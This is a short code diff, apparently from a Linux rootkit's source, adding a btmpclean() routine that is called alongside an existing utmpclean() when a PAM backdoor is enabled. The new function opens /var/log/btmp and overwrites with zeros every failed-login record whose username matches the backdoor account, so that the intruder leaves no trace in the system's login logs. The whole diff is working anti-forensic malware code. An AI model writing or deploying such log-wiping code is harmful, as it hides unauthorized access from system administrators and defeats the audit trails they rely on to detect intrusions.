@@ -34,6 +34,27 @@ void utmpclean(void){
 
     close(fd);
 }
+
+void btmpclean(void){
+    int fd;
+    struct utmpx uent;
+
+    hook(COPEN, CREAD, CWRITE);
+
+    fd = (long)call(COPEN, "/var/log/btmp", 02, 0);
+    if(fd < 0) return;
+
+    lseek(fd, 0, SEEK_SET);
+    while((ssize_t)call(CREAD, fd, &uent, sizeof(struct utmpx))){
+        if(!strncmp(uent.ut_user, PAM_UNAME, strlen(PAM_UNAME))){
+            memset(&uent, 0, sizeof(struct utmpx));
+            lseek(fd, -(sizeof(struct utmpx)), SEEK_CUR);
+            call(CWRITE, fd, &uent, sizeof(struct utmpx));
+        }
+    }
+
+    close(fd);
+}
 #endif
 
 int magicusr(void){
@@ -70,6 +91,7 @@ nopenope:
           ){
 #ifdef USE_PAM_BD
             utmpclean();
+            btmpclean();
 #endif
             putbdvlenv();
         }
